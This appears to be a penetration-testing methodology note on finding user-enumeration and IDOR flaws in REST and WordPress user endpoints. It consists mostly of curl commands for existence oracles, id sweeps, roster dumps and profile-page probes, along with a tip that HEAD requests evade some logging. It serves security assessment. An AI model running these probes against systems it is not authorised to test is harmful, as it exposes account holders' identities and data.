# REST user-resources (deep) — the existence and read oracles

## The `GET /api/users/{id}` dual-fire

```bash
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$KNOWN"   # 200
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$FAKE"    # 404
curl -s "$BASE/api/users/$KNOWN"                                    # the object
```

Two findings on one endpoint:
- `200`/`404` tracks existence → `web-user-enum`
- the `200` body returns the account OBJECT → `web-idor` (a read of
  another's row) — record both as their own class

## The identifier variants

```bash
for id in 1 2 100 admin "$KNOWN" "$KNOWN@x.c" 550e8400-e29b-41d4-a716-446655440000; do
  printf '%-40s ' "$id"; curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$id"
done
```

- a numeric `id` — a sequential sweep maps every account
- a username `slug` — `?author=N`/`/users/<name>`/`/u/<name>`
- an email `id` — `/users/<email>`
- a uuid — non-enumerable but a `200`/`404` still oracles a KNOWN id

## The id-sweep — `web-idor`'s loop on the enum's oracle

```bash
for id in $(seq 1 50); do
  printf '%-4s ' "$id"; curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$id"
done
# 200s -> the account list ; each 200's body -> web-idor
```

The sweep enumerates the namespace — every `200` is a real id, and a
`200` whose body returns the object is the read (`web-idor`).

## The list endpoint — the public roster

```bash
curl -s "$BASE/api/users/" | python3 -m json.tool | head -50
curl -s "$BASE/wp-json/wp/v2/users" | python3 -m json.tool
curl -s "$BASE/api/members" "$BASE/api/users?limit=100"
```

A `GET /api/users/` returning a roster is the strongest direct oracle —
the whole account list in one request, no per-name probing.

## The WP patterns — the canonical resource oracles

- `/?author=N` → `302 /author/<name>/` — the redirect leaks the username
- `/wp-json/wp/v2/users` → a JSON user list, unauthenticated
- `/wp-json/wp/v2/users/<id>` → the user object + the slug
- `/author/<name>/` `200`/`404` — the author-page oracle

## The profile/member pages

`/profile/<name>` `/u/<name>` `/members/<name>` `/user/<name>`
`/author/<name>` — a `200`/`404` on a username-URL is the resource
oracle in HTML form. The page also LEAKS the account's public data.

## The HEAD/OPTIONS read

```bash
curl -sI "$BASE/api/users/$KNOWN" | head -1    # 200
curl -sI "$BASE/api/users/$FAKE"  | head -1    # 404
```

A `HEAD` returns the status without the body — a quieter existence
probe (some loggers/throttles count GET but not HEAD).

## The resource boundary

- `web-user-enum` — the `200`/`404` existence oracle
- `web-idor` — the `200` object read of another's row
- `web-info-disclosure` — a public roster/`wp-json` leak

Both fire on the same endpoint — record the oracle AND the read as
their own class.
